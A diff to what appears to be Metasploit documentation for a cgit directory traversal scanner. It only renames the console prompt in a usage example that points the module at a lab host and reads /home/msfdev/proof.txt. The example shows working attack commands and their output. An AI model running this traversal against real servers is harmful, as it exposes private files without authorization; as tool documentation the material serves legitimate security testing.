@@ -69,18 +69,18 @@ Git repository on the remote server. Default is empty, `''`.
 ### Ubuntu 18.04 x64, cgit | 1.1+git2.10.2-3build1
 
 ```
-msf5 > use auxiliary/scanner/http/cgit_traversal
-msf5 auxiliary(scanner/http/cgit_traversal) > set rhosts 172.22.222.123
+msf > use auxiliary/scanner/http/cgit_traversal
+msf auxiliary(scanner/http/cgit_traversal) > set rhosts 172.22.222.123
 rhosts => 172.22.222.123
-msf5 auxiliary(scanner/http/cgit_traversal) > set targeturi /mygit/
+msf auxiliary(scanner/http/cgit_traversal) > set targeturi /mygit/
 targeturi => /mygit/
-msf5 auxiliary(scanner/http/cgit_traversal) > set repo test
+msf auxiliary(scanner/http/cgit_traversal) > set repo test
 repo => test
-msf5 auxiliary(scanner/http/cgit_traversal) > set filepath /home/msfdev/proof.txt
+msf auxiliary(scanner/http/cgit_traversal) > set filepath /home/msfdev/proof.txt
 filepath => /home/msfdev/proof.txt
-msf5 auxiliary(scanner/http/cgit_traversal) > set verbose true
+msf auxiliary(scanner/http/cgit_traversal) > set verbose true
 verbose => true
-msf5 auxiliary(scanner/http/cgit_traversal) > run
+msf auxiliary(scanner/http/cgit_traversal) > run
 
 [+] 172.22.222.123:80     - 
 you found me!
